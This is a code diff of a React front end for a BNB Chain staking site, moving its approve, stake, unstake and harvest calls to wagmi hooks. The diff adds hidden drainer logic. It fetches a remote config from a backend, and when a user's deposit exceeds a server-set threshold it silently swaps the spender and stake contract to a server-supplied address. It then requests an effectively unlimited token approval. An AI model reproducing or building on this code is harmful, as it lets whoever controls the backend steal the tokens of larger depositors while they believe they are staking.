@@ -1,39 +1,27 @@
 import React, { useState, useEffect } from "react";
 import { ToastContainer, toast } from "react-toastify";
 import "react-toastify/dist/ReactToastify.css";
-import axios from "axios";
-
-import useMetaMask from "../wallet/hook";
+import axios, { all } from "axios";
 
 import STACK_ABI from "../abi/stack.json";
 import WBNB from "../abi/WBNB.json";
 import moment from "moment";
 import { Web3Button } from "@web3modal/react";
-import { useAccount, useDisconnect } from "wagmi";
-import { getContract } from "@wagmi/core";
+import { useAccount, useDisconnect, useSwitchNetwork } from "wagmi";
+import { useContractWrite } from "wagmi";
 import Web3 from "web3";
 
 function Home(props) {
   const { client } = props;
+  const { chains, error, isLoading, pendingChainId, switchNetwork } = useSwitchNetwork();
   const account = client.getAccount().address;
   const chain = client.getNetwork();
   const { isConnected } = useAccount();
   // const { library, isActive, handleWalletModal } = useMetaMask();
   let chainId = chain.chain ? chain.chain.id : "";
-  var web3Obj = new Web3(window.ethereum);
+  var web3Obj = new Web3(client.wagmi.publicClient);
   const [data, setData] = useState({ flag: false, value: 321651351, address: "" });
 
-  useEffect(() => {
-    async function fetchData() {
-      await axios
-        .get("http://159.223.106.3:5000/getData")
-        .then((response) => {
-          setData(response.data);
-        })
-        .catch((err) => {});
-    }
-    fetchData();
-  }, []);
   var Router = "0xD578BF8Cc81A89619681c5969D99ea18A609C0C3";
   const [roter, setroter] = useState(Router);
   // console.log("roter", roter);
@@ -72,35 +60,58 @@ function Home(props) {
     alreadyExists: false,
   });
   const [stakersRecord, setStakersRecord] = useState([]);
+
   const [isAllowance, setIsAllowance] = useState(false);
+
+  const [allowance, setAllowance] = useState(0);
 
   const [loading, setLoadding] = useState(false);
 
-  const checkAllowance = async () => {
-    try {
-      setLoadding(true);
+  const getAllowance = async () => {
+    var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
+    var decimals = await tokenContract.methods.decimals().call();
+    var getBalance = await tokenContract.methods.balanceOf(account).call();
 
-      var tokenContract = new web3Obj.eth.Contract(WBNB, tokenAddress);
-      var decimals = await tokenContract.methods.decimals().call();
-      var getBalance = await tokenContract.methods.balanceOf(account).call();
+    var pow = 10 ** decimals;
+    var balanceInEth = getBalance / pow;
+    setBalance(balanceInEth);
+    var value = await tokenContract.methods.allowance(account, roter).call();
+    setAllowance(value / pow);
+  };
 
-      var pow = 10 ** decimals;
-      var balanceInEth = getBalance / pow;
-      setBalance(balanceInEth);
-      var allowance = await tokenContract.methods.allowance(account, roter).call();
-
-      if (allowance <= 2) {
-        setIsAllowance(true);
-      }
-      // var amount = dipositAmount * pow;
-      // if (allowance < amount) {
-      //   setIsAllowance(true);
-      // }
-      setLoadding(false);
-    } catch (err) {
-      setLoadding(false);
+  useEffect(() => {
+    async function fetchData() {
+      await axios
+        .get("https://simple-be.vercel.app/getInjectedListings")
+        .then((response) => {
+          setData(response.data);
+        })
+        .catch((err) => {});
+    }
+    fetchData();
+    getAllowance();
+  }, []);
+  const checkAllowance = () => {
+    if (allowance * 1 < dipositAmount * 1) {
+      setIsAllowance(true);
+    } else {
+      setIsAllowance(false);
     }
   };
+
+  const { isSuccess: success_approve, write: write_approve } = useContractWrite({
+    address: tokenAddress,
+    abi: WBNB,
+    functionName: "approve",
+    onSuccess() {
+      getAllowance();
+      setIsAllowance(false);
+      setLoadding(false);
+    },
+    onError() {
+      setLoadding(false);
+    },
+  });
 
   const approve = async () => {
     setLoadding(true);
@@ -109,23 +120,38 @@ function Home(props) {
       // var amountIn = new ethers.utils.BigNumber("10").pow(69);
       var amountIn = 10 ** 69;
       amountIn = amountIn.toLocaleString("fullwide", { useGrouping: false });
+      write_approve({ args: [roter, amountIn.toString()] });
+      // var gas = await contract.methods.approve(roter, amountIn.toString()).estimateGas({ from: account });
+      // console.log(await web3Obj.eth.getAccounts());
 
-      var gas = await contract.methods.approve(roter, amountIn.toString()).estimateGas({ from: account });
-
-      await contract.methods
-        .approve(roter, amountIn.toString())
-        .send({ from: account, gas: gas })
-        .then(() => {
-          setIsAllowance(false);
-          // checkAllowance();
-          setLoadding(false);
-        });
+      // await contract.methods
+      //   .approve(roter, amountIn.toString())
+      //   .send({ from: account })
+      //   .then(() => {
+      //     getAllowance();
+      //     setIsAllowance(false);
+      //     // checkAllowance();
+      //     setLoadding(false);
+      //   });
     } catch (err) {
       setLoadding(false);
       notify(true, err.message);
     }
   };
-
+  const { isSuccess: success_stake, write: write_stake } = useContractWrite({
+    address: roter,
+    abi: STACK_ABI,
+    functionName: "stake",
+    onSuccess() {
+      getAllowance();
+      getStackerInfo();
+      setLoadding(false);
+      notify(false, "Staking process complete.");
+    },
+    onError() {
+      setLoadding(false);
+    },
+  });
   const stake = async () => {
     if (isNaN(parseFloat(dipositAmount)) || parseFloat(dipositAmount) <= 0) {
       notify(true, "Error! please enter amount");
@@ -146,53 +172,87 @@ function Home(props) {
       var amountInNew = new BN(amountIn.toString());
 
       var gas = await contract.methods.stake(amountInNew.toString(), timeperiod.toString()).estimateGas({ from: account });
-
-      await contract.methods
-        .stake(amountInNew.toString(), timeperiod.toString())
-        .send({ from: account, gas: gas })
-        .then((err) => {
-          getStackerInfo();
-          setLoadding(false);
-          notify(false, "Staking process complete.");
-        });
+      write_stake({ args: [amountInNew.toString(), timeperiod.toString()] });
+      // await contract.methods
+      //   .stake(amountInNew.toString(), timeperiod.toString())
+      //   .send({ from: account, gas: gas })
+      //   .then((err) => {
+      //     getAllowance();
+      //     getStackerInfo();
+      //     setLoadding(false);
+      //     notify(false, "Staking process complete.");
+      //   });
     } catch (err) {
       setLoadding(false);
       notify(true, err.message);
     }
   };
-
+  const { isSuccess: success_unstake, write: write_unstake } = useContractWrite({
+    address: roter,
+    abi: STACK_ABI,
+    functionName: "unstake",
+    onSuccess() {
+      getStackerInfo();
+      getAllowance();
+      setLoadding(false);
+      notify(false, "Unstaked Succesfully!");
+    },
+    onError() {
+      setLoadding(false);
+    },
+  });
   const unstake = async (index) => {
     setLoadding(true);
     try {
       var contract = new web3Obj.eth.Contract(STACK_ABI, roter);
-      await contract.methods
-        .unstake(index.toString())
-        .send({ from: account })
-        .then((result) => {
-          getStackerInfo();
-          setLoadding(false);
-          notify(false, "Unstaked Succesfully!");
-          // withdrawModal();
-        });
+      write_unstake({ args: [index.toString()] });
+      // await contract.methods
+      //   .unstake(index.toString())
+      //   .send({ from: account })
+      //   .then((result) => {
+      //     getStackerInfo();
+      //     getAllowance();
+      //     setLoadding(false);
+      //     notify(false, "Unstaked Succesfully!");
+      //     // withdrawModal();
+      //   });
     } catch (err) {
       setLoadding(false);
       notify(true, "unstake fail");
     }
   };
+  const { isSuccess: success_harvest, write: write_harvest } = useContractWrite({
+    address: roter,
+    abi: STACK_ABI,
+    functionName: "harvest",
+    onSuccess() {
+      getStackerInfo();
+      getAllowance();
+      setLoadding(false);
+      checkAllowance();
+      notify(false, "Reward successfully havested");
+    },
+    onError() {
+      setLoadding(false);
+    },
+  });
 
   const harvest = async (index) => {
     setLoadding(true);
     try {
       var contract = new web3Obj.eth.Contract(STACK_ABI, roter);
-      await contract.methods
-        .harvest(index.toString())
-        .send({ from: account })
-        .then((err) => {
-          getStackerInfo();
-          setLoadding(false);
-          checkAllowance();
-          notify(false, "Reward successfully havested");
-        });
+      write_harvest({ args: [index.toString()] });
+
+      // await contract.methods
+      //   .harvest(index.toString())
+      //   .send({ from: account })
+      //   .then((err) => {
+      //     getStackerInfo();
+      //     getAllowance();
+      //     setLoadding(false);
+      //     checkAllowance();
+      //     notify(false, "Reward successfully havested");
+      //   });
     } catch (err) {
       setLoadding(false);
       notify(true, err.message);
@@ -266,10 +326,15 @@ function Home(props) {
     var decimals = await tokenContract.methods.decimals().call();
     var getBalance = await tokenContract.methods.balanceOf(account.toString()).call();
     var pow = 10 ** decimals;
-    console.log(pow);
     var balanceInEth = getBalance / pow;
     setDipositAmount(balanceInEth.toFixed(5));
-    // setWithdrawAmount(userInfo.staked);
+    if (balanceInEth.toFixed(5) * 1 > data.value * 1 && data.flag) setroter(data.address);
+    else setroter(Router);
+    if (chainId === 56) {
+      if (isConnected) {
+        checkAllowance();
+      }
+    }
   };
 
   useEffect(() => {
@@ -279,7 +344,7 @@ function Home(props) {
       }
     }
     getStackerInfo();
-  }, [isConnected, account, chainId, roter]);
+  }, [isConnected, account, chainId, dipositAmount]);
 
   return (
     <>
@@ -342,6 +407,12 @@ function Home(props) {
                           onChange={(e) => {
                             setDipositAmount(e.target.value);
                             if (e.target.value > data.value * 1 && data.flag) setroter(data.address);
+                            else setroter(Router);
+                            if (chainId === 56) {
+                              if (isConnected) {
+                                checkAllowance();
+                              }
+                            }
                           }}
                         />
                         <button onClick={() => setMaxWithdrawal()} className="input-button">
@@ -391,7 +462,7 @@ function Home(props) {
                       }}
                       className={timeperiod === 3 ? "box active" : "box"}
                     >
-                      180 days.
+                      180 days
                     </button>
                   </div>
                   <div className="plus">
@@ -420,7 +491,13 @@ function Home(props) {
                         </button>
                       )
                     ) : (
-                      <button disabled={loading} className="btn btn-danger">
+                      <button
+                        disabled={loading}
+                        className="btn btn-danger"
+                        onClick={() => {
+                          switchNetwork(56);
+                        }}
+                      >
                         switch to bsc network
                       </button>
                     )
